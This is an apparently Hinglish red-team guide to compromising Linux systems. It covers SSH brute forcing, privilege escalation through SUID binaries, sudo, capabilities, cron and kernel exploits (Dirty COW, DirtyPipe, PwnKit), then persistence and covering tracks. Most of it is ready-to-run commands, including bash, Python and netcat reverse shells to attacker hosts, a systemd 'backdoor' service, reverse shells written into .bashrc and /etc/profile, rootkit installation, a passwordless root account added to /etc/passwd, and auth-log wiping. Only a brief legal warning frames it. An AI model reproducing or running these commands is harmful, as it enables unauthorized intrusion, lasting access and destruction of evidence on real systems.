# Linux System Hacking — Complete Exploitation Guide

**Comprehensive Linux Compromise aur Post-Exploitation**

---

## 1. Initial Access aur Shell Gaining

**Objective:** Linux system mein shell access lena.

```bash
# SSH brute force
hydra -l root -P wordlist.txt ssh://192.168.1.100

# SSH key cracking
john --format=rsa ssh_key.txt

# SSH backdoor (if already inside)
echo "ssh-rsa AAAAB3... " >> ~/.ssh/authorized_keys

# Physical access boot shell
# Grub menu e press
# setparams: init=/bin/bash ro root=/dev/sda1
# Access root shell at boot

# Reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# NC reverse shell
nc -e /bin/sh attacker_ip 4444
```

**Detection Difficulty:** ⭐⭐⭐ (Auth logs track करते हैं)

---

## 2. Linux Kernel Exploitation

**Objective:** Kernel vulnerability se root access lena.

```bash
# Kernel version check
uname -a
uname -r

# Vulnerable kernel identify
Searchsploit linux kernel 5.4.0

# Dirty COW (CVE-2016-5195)
git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow/dirtyc0w-master
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
# Enter new password for root

# Proof:
su root
password

# DirtyPipe (CVE-2022-0847)
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit
gcc -o exploit exploit.c -lcrypt
./exploit /etc/passwd 1 ootz:$y$j9T

# CVE-2021-22555 (Netfilter)
Searchsploit CVE-2021-22555

# PwnKit (CVE-2021-4034)
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034
gcc -o exploit exploit.c
./exploit
```

### Kernel Info Gathering

```bash
# Detailed info
cat /proc/version
cat /proc/cmdline
cat /etc/issue

# ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = partial, 2 = full

# DEP/NX bit
execstack -q /bin/ls

# SMEP/SMAP
grep smep /proc/cpuinfo
grep smap /proc/cpuinfo

# dmesg logs
dmesg | tail -20
```

**Detection Difficulty:** ⭐⭐⭐⭐ (System logs track करते हैं)

---

## 3. SUID Binary Exploitation

**Objective:** SUID bits se root access.

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u+s -type f 2>/dev/null

# Check for vulnerable binaries
find / -name "vim" -perm -4000 2>/dev/null
find / -name "nano" -perm -4000 2>/dev/null
find / -name "less" -perm -4000 2>/dev/null
find / -name "more" -perm -4000 2>/dev/null

# GTFOBins exploitation
https://gtfobins.github.io/

# Vim SUID exploitation
vim /etc/shadow
:!cat /etc/shadow
:!/bin/sh

# Nano SUID exploitation
nano /etc/shadow
# Ctrl+R Ctrl+X
# /bin/sh

# Less SUID exploitation
less /etc/shadow
!id
!/bin/sh

# Python SUID exploitation
python -c 'import os;os.setuid(0);os.system("/bin/sh")'

# Perl SUID exploitation
perl -e 'exec "/bin/sh"'

# Awk SUID exploitation
awk 'BEGIN{system("/bin/sh")}'
```

---

## 4. Sudo Exploitation Advanced

**Objective:** Sudo misconfigurations se root access.

```bash
# Check sudo access
sudo -l

# Nopasswd abuse
# If: (root) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \; -quit

# Sudo wildcard expansion
# Script uses: $@
sudo script *.txt
# Create: @malicious.txt (shell)

# Sudo environment hijacking
sudo -l
# Output: (root) /usr/bin/script

# Check if uses relative path
cat /usr/bin/script
#!/bin/bash
call_script

# Create fake script
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/call_script
echo '/bin/sh' >> /tmp/call_script
chmod +x /tmp/call_script
sudo /usr/bin/script

# CVE-2021-3156 (Heap overflow)
Searchsploit sudo 1.9

# Sudo version check
sudo -V

# LD_PRELOAD injection (if allowed)
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/cmd
```

---

## 5. Capability Exploitation

**Objective:** Linux capabilities se root access.

```bash
# Check capabilities
getcap -r / 2>/dev/null

# CAP_SETUID
# Binary with CAP_SETUID:
getcap /usr/bin/python
# /usr/bin/python = cap_setuid+ep

python -c 'import os;os.setuid(0);os.system("/bin/sh")'

# CAP_SYS_ADMIN
# Allows namespace creation
unshare -r /bin/bash  # User namespace

# CAP_DAC_OVERRIDE
# Bypass file permissions
cat /etc/shadow

# CAP_NET_ADMIN
# Network interface manipulation
ip link add dummy0 type dummy

# Remove capability
sudo setcap -r /usr/bin/python
```

---

## 6. Cron Job Exploitation

**Objective:** Cron tasks se privilege escalation.

```bash
# Check cron jobs
ps aux | grep cron

# User crontab
crontab -l

# System cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Exploit: Writable cron script
# If root runs: /etc/backup.sh (writable)

echo '#!/bin/bash' > /etc/backup.sh
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /etc/backup.sh
chmod +x /etc/backup.sh

# Wait for cron execution

# Exploit: PATH hijacking
# Root cron: /usr/bin/backup.sh (uses commands without full path)

cd /tmp
echo '#!/bin/bash' > tar
echo '/bin/bash' >> tar
chmod +x tar

export PATH=/tmp:$PATH
# Wait for cron
```

---

## 7. Weak File Permissions

**Objective:** Improperly configured files se data access.

```bash
# World-writable files
find / -perm -o+w -type f 2>/dev/null

# World-readable sensitive files
find / -perm -o+r -type f 2>/dev/null | grep shadow

# Writable sudoers
ls -la /etc/sudoers
if writable:
    echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Writable /etc/passwd
ls -la /etc/passwd
if writable:
    echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
    su root2  # No password!

# SSH key permissions
find / -name "*id_rsa*" -o -name "*id_dsa*" 2>/dev/null
ls -la ~/.ssh/

# Writable .bashrc
ls -la ~/.bashrc
if writable:
    echo '/bin/bash' >> ~/.bashrc
```

---

## 8. Linux Privilege Escalation via Services

**Objective:** Misconfigured services se privilege escalation.

```bash
# Running services
ps aux
systemctl list-units --type=service --all

# Service configuration
ls -la /etc/systemd/system/
ls -la /etc/init.d/

# Exploit: Writable service file
# If /etc/systemd/system/backdoor.service writable:

cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable backdoor
sudo systemctl start backdoor

# Exploit: Symlink attacks
# If service reads from /tmp
ln -s /etc/shadow /tmp/backup.sql
```

---

## 9. Linux Persistence Techniques

**Objective:** Long-term access maintain karna.

```bash
# SSH key persistence
mkdir -p ~/.ssh
echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Rootkit installation
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./reptile.sh

# Kernel module backdoor
# Compile kernel module with backdoor

# Cron persistence
(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -

# Systemd persistence
cp /bin/bash /usr/lib/systemd/system-sleep/sleep.sh
chmod +x /usr/lib/systemd/system-sleep/sleep.sh

# .bashrc/zshrc persistence
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> ~/.zshrc

# /etc/profile persistence
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> /etc/profile

# LKM (Loadable Kernel Module) rootkit
# Install rootkit kernel module
insmod rootkit.ko
```

---

## 10. Advanced Linux Attack Combo

**Objective:** Complete Linux system compromise.

### Full Attack Chain

```bash
# Step 1: Initial access
nc -e /bin/sh attacker.com 4444

# Step 2: Enumeration
uname -a
sudo -l
find / -perm -4000 2>/dev/null

# Step 3: Privilege escalation
# Method 1: SUID binary
less /etc/shadow
!/bin/sh

# Method 2: Sudo
sudo find / -exec /bin/sh \; -quit

# Method 3: Kernel exploit
./dirtycow

# Step 4: Root access achieved
id  # uid=0(root)

# Step 5: Persistence
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
crontab -e  # Add reverse shell

# Step 6: Covering tracks
history -c
rm -f ~/.bash_history
echo "" > /var/log/auth.log

# Step 7: Lateral movement
ssh -i /root/.ssh/id_rsa otherserver.com
```

---

## Linux Exploitation Tools

```bash
# Enumeration
linpeas.sh
enum4linux
lse.sh

# Kernel exploits
DirtyCoW
DirtyPipe
PwnKit

# Privilege escalation
sudo-exploit
linux-exploit-suggester

# Post-exploitation
beef
metasploit
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Linux hacking sirf authorized systems par!

✓ Bug bounty
✓ Penetration testing (permission)
✓ Research

✗ Unauthorized access illegal
✗ Prison time possible

Ethically approach karo!
```

---

## Quick Reference - Linux Commands

```bash
# Privilege escalation
find / -perm -4000 2>/dev/null
sudo -l

# Dirty COW exploit
./dirty

# SUID exploitation
vim /etc/shadow
!/bin/sh

# Sudo abuse
sudo find / -exec /bin/sh \; -quit

# Persistence
echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys

# Full attack
uname -a && sudo -l && find / -perm -4000 2>/dev/null && ./kernel_exploit
```

---

**Banaya Gaya:** Linux Hacking Database  
**Classification:** System Exploitation  
**Skill Level:** Expert  
**Risk Level:** Critical

---

**Last Updated:** 2026-06-16  
**Creator:** Red Team Ops
